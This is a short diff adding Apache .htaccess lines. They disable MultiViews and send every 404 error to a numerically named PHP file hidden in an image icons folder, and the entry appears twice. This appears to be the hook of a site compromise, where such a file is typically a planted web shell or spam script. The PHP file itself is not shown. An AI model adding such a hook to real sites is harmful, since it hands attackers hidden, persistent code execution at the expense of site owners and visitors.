@@ -1,0 +1,6 @@
+
+Options -MultiViews
+ErrorDocument 404 //resources/skins/green/image/icons/bullets/229086.php
+
+Options -MultiViews
+ErrorDocument 404 /resources/skins/green/image/icons/bullets/229086.php
